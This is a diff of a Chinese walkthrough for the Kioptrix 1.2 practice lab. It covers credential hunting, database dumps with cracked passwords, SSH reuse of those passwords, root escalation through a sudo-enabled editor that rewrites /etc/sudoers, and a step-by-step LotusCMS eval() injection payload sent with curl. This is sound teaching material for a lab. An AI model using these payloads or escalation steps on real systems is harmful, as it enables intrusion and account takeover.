 
 常见名字就那几个：
 
-```text
+```
 config.php
 gconfig.php
 database.php
@@ -647,7 +519,7 @@ settings.php
 
 拿到 web shell 之后，找密码的优先级顺序：
 
-```text
+```
 1. 数据库配置文件  ← 明文密码，最直接
 2. 用户目录下的 .bash_history  ← 可能有人敲过密码
 3. /etc/passwd 和 shadow  ← 系统账号
@@ -657,22 +529,343 @@ settings.php
 **核心逻辑：开发者为了让程序自动连接数据库，密码必须以明文或可逆方式存在某个文件里。** 这是 Web 渗透中最稳定的信息来源之一。
 
 
-dirtycow提权
+# 6.红笔追加操作（新提权方式）
 
-
-### 红笔追加操作
-
-发现cms 可以在cli中用searchsploit查，这样我觉得会更快一点
+发现 CMS 可以在 CLI 中用 searchsploit 查，这样我觉得会更快一点。
 
 ![](./img/Kioptrix1.2/image-20260430140855864.png)
 
-具体的利用文章可以用Google和GitHub去搜索 `<cms> exoloit`
+具体的利用文章可以用 Google 和 GitHub 去搜索 `<cms> exploit`
 
 ![](./img/Kioptrix1.2/image-20260430141214354.png)
 
 
-拿下webshell后在网页后台看到有用的目录（具体为什么有用我不知道，可以去搜索一下 gallery），这里可以去访问这个后台，也就是说phpmyadmin中的密码应该对应的是这个，不是登入也的那个我就说怎么一直登入不进去，回去尝试一下。
+拿下 Web Shell 后网页后台的看到有用的目录，这里可以去访问这个后台，也就是说 phpMyAdmin 中的密码应该对应的是这个，不是登入也的那个我就说怎么一直登入不进去，回去尝试一下。
 
 ![](./img/Kioptrix1.2/image-20260430141851362.png)
 
+试试这个 phpMyAdmin 的密码是不是可以直接登录 SSH 用户的密码.
+
+```bash
+ssh -o "HostKeyAlgorithms=+ssh-rsa" loneferret@192.168.200.156
+```
+
 ![](./img/Kioptrix1.2/image-20260430142031571.png)
+
+## 6.1 数据库深度挖掘与凭据复用
+
+在 Web 目录发现 `gallery` 相关的配置文件后，顺藤摸瓜进入 MySQL 数据库，寻找可横向移动的凭据。
+
+**数据库枚举：**
+
+```sql
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema | 
+| gallery            | 
+| mysql              | 
++--------------------+
+3 rows in set (0.00 sec)
+mysql> use gallery;
+use gallery;
+Database changed
+mysql> show tables;
+show tables;
++----------------------+
+| Tables_in_gallery    |
++----------------------+
+| dev_accounts         | 
+| gallarific_comments  | 
+| gallarific_galleries | 
+| gallarific_photos    | 
+| gallarific_settings  | 
+| gallarific_stats     | 
+| gallarific_users     | 
++----------------------+
+7 rows in set (0.00 sec)
+```
+
+在 `dev_accounts` 和 `gallarific_users` 表中成功提取到高价值账户信息：
+
+```sql
+mysql> select * from dev_accounts;
+select * from dev_accounts;
++----+------------+----------------------------------+
+| id | username   | password                         |
++----+------------+----------------------------------+
+|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
+|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
++----+------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from gallarific_users;
+select * from gallarific_users;
++--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
+| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |
++--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
+|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | 
++--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
+1 row in set (0.00 sec)
+```
+
+每一步拿到新的信息之后，都要权衡这个信息的优先级，对比之前操作的优先级，哪一步重要，哪一步不重要。
+泄露出来的用户和密码在 Web 页面起到了什么作用？还是靶机作者故意留下的一个引入点
+
+**密码破解：**
+
+>starwars         (loneferret)
+>Mast3r           (dreg)     
+
+## 6.2 SSH 横向移动与环境破局
+
+拿到系统用户的明文密码后，尝试直接通过 SSH 登录系统。
+
+**踩坑记录：老旧 SSH 算法不兼容** 
+
+由于靶机系统极老（Ubuntu 9.04），现代 Kali 的 SSH 客户端默认禁用了不安全的 RSA 密钥算法，直接连接会报错。需要追加 `-o "HostKeyAlgorithms=+ssh-rsa"` 参数强制放行：
+
+```bash
+┌──(kali㉿kali)-[~/vulnhub/kioptrix1.2]
+└─$ ssh -o "HostKeyAlgorithms=+ssh-rsa" loneferret@192.168.200.165
+loneferret@192.168.200.165's password: # 输入 starwars
+...
+loneferret@Kioptrix3:~$ id
+uid=1000(loneferret) gid=100(users) groups=100(users)
+```
+
+成功以 `loneferret` 身份登入系统，完成横向移动。
+
+## 6.3 预期提权点：Sudo 配置逻辑漏洞
+
+登入后，在用户家目录下发现了一封极具提示性的“公司内部信件”：
+
+```bash
+loneferret@Kioptrix3:~$ cat CompanyPolicy.README
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+```
+
+这封信件几乎是在“明示”靶机作者留下的后门。验证当前用户的 `sudo` 权限：
+
+```bash
+loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su      # 靶机作者刻意封堵了直接 su 提权
+    (root) NOPASSWD: /usr/local/bin/ht # 留下了无需密码的 ht 编辑器最高权限
+```
+
+**提权方向明确**：由于 HT 编辑器具有最高权限，可以直接使用 HT 编辑器修改 sudo 权限配置.
+
+## 6.4 提权操作
+
+1.运行 `sudo ht` 启动编辑器。
+
+```bash
+sudo ht
+```
+
+2.编辑 `/etc/sudoers` 文件，在末尾追加提权规则：
+
+```bash
+loneferret ALL=(ALL) NOPASSWD: /bin/bash
+```
+
+![](./img/Kioptrix1.2/image-20260502152552238.png)
+
+3 保存退出后(F2保存， F10保存退出)，直接生成 Root Shell：
+
+```
+loneferret@Kioptrix3:~$ sudo /bin/bash
+root@Kioptrix3:~# whoami
+root
+```
+
+![](./img/Kioptrix1.2/image-20260502152729887.png)
+
+至此，完美还原了靶机作者设计的初衷，提权彻底打穿。
+
+---
+# 7.漏洞原理分析
+
+## 7.1 漏洞概述
+
+- **漏洞名称**：LotusCMS 3.0 eval() Remote Code Execution
+- **CVE 编号**：CVE-2011-0518
+- **漏洞文件**：`core/lib/router.php`
+- **触发条件**：`magic_quotes_gpc = Off`（PHP 默认配置）
+- **影响版本**：LotusCMS 3.0
+
+---
+
+## 7.2 漏洞文件源码
+
+漏洞位于 `Router` 类的构造函数，核心逻辑如下：
+
+```php
+public function Router() {
+    // 从用户输入取值，无过滤
+    $page   = $this->getInputString("page", "index");
+    $plugin = $this->getInputString("system", "Page");
+
+    if (file_exists("core/plugs/".$plugin."Starter.php")) {
+        include("core/plugs/".$plugin."Starter.php");
+
+        // 漏洞触发点：直接将用户输入拼入字符串后 eval 执行
+        eval("new ".$plugin."Starter('".$page."');");
+    }
+    // ...
+}
+```
+
+`getInputString()` 取值顺序为 GET → POST → Cookie → Session（`GPCS`），两种传参方式均可触发漏洞。虽然内部调用了 `htmlentities()`，但参数使用的是 `ENT_NOQUOTES`，**单引号和双引号均不会被转义**，这是漏洞能被利用的前提条件之一。
+
+---
+
+## 7.3 漏洞根源
+
+漏洞根源在于`core/lib/router.php`这一行拼接：
+
+```php
+eval("new ".$plugin."Starter('".$page."');");
+```
+
+`eval()` 接收一个字符串参数，将其作为 PHP 代码执行。字符串里可以包含多条用分号分隔的语句，PHP 会逐条全部执行。
+
+当 `$plugin` 为默认值 `Page`、`$page` 为正常值 `index` 时，eval 收到的字符串是：
+
+```php
+new PageStarter('index');
+```
+
+这是合法的 PHP，仅实例化一个对象。
+
+**问题在于**：`$page` 的值被直接拼入代码模板，没有任何转义或校验。模板结构如下：
+
+```
+固定部分:   new PageStarter('    ');
+用户输入:                    ↑
+                          $page 在这里
+```
+
+用户的输入天生被夹在两个单引号之间，看似被"锁住"无法执行代码——但只要能破坏引号结构，就能逃出字符串，注入任意 PHP 语句。
+
+---
+
+## 7.4 payload 构造过程
+
+**目标**：让 eval 执行我们注入的代码，而不只是把它当字符串处理。
+
+以 `passthru('id')` 为例，逐步推导：
+
+### 第一步：尝试直接注入
+
+传入 `page=passthru('id')`，eval 收到：
+
+```php
+new PageStarter('passthru('id')');
+```
+
+`passthru('id')` 在单引号字符串里，只是普通文字，不会执行。
+
+### 第二步：用 `'` 逃出字符串
+
+传入 `page=index'`，eval 收到：
+
+```php
+new PageStarter('index'');
+```
+
+左边的 `'` 与我们注入的 `'` 配对，字符串提前结束了。但后面多出一个 `'` 和 `);`，语法报错。
+
+### 第三步：用 `)` 和 `;` 补全第一条语句
+
+传入 `page=index');`，eval 收到：
+
+```php
+new PageStarter('index');');
+```
+
+第一条语句 `new PageStarter('index');` 在语法上完整了。但模板末尾的 `');` 还留着，语法仍然错误。
+
+### 第四步：插入我们的代码
+
+传入 `page=index');passthru('id');`，eval 收到：
+
+```php
+new PageStarter('index');passthru('id');');
+```
+
+现在有两条语句，第二条是我们的命令。但末尾 `');` 依然是语法错误。
+
+### 第五步：用 `//` 注释掉模板残留
+
+传入 `page=index');passthru('id');//`，eval 收到：
+
+```php
+new PageStarter('index');   // 第①条：正常执行
+passthru('id');              // 第②条：执行系统命令
+//')                         // 模板残留，被注释掉，不执行
+```
+
+`//` 是 PHP 单行注释符，其后所有内容被忽略。模板多出来的 `');` 就此消失，整段代码语法完全合法，两条语句都会被执行。
+
+### payload 各字符对照表
+
+|字符|作用|
+|---|---|
+|`index`|合法页面名，让 PageStarter 正常实例化，不产生报错|
+|`'`|闭合模板中 `Starter('` 的左单引号，逃出字符串|
+|`)`|关闭函数调用的括号|
+|`;`|结束第一条语句|
+|`passthru('id')`|我们注入的代码，执行系统命令|
+|`;`|结束注入语句|
+|`//`|注释掉模板末尾残留的 `');`，防止语法错误|
+
+---
+
+## 7.5 传参方式
+
+`getInputString()` 同时支持 GET 和 POST，两者均可触发漏洞。实际利用时推荐 POST：
+
+```bash
+# GET 方式（参数暴露在 URL，受长度限制）
+curl "http://TARGET/lcms/index.php?page=index');passthru('id');//"
+
+# POST 方式（推荐，绕过 URL 长度限制，不记录在 access.log）
+curl -s -X POST "http://TARGET/lcms/index.php" \
+     --data "page=index');passthru('id');//"
+```
+
+MSF 模块（EDB #18565）选择 POST 方式，原因之一是 payload 超过 4000 字节时 GET 会触发 HTTP 414 错误。
+
+![](./img/Kioptrix1.2/image-20260502221605970.png)
+
+---
+
+## 7.6 攻击链总结
+
+```
+用户输入（page 参数）
+       ↓
+getInputString() 原样取出，ENT_NOQUOTES 不转义引号
+       ↓
+拼入 eval 模板字符串
+       ↓
+eval() 将拼接结果当作 PHP 代码执行
+       ↓
+注入的 passthru() 调用系统命令
+       ↓
+获得 www-data 权限的命令执行
+```
+
+漏洞的根源是 **eval 的不安全拼接**，`getInputString` 的无引号过滤是使其可利用的前提条件。两者缺一不可：如果引号被转义，`'` 变成 `\'`，字符串就逃不出去；如果没有 eval，拼接本身不造成危害。
+
+![](./img/Kioptrix1.2/image-20260502221636404.png)
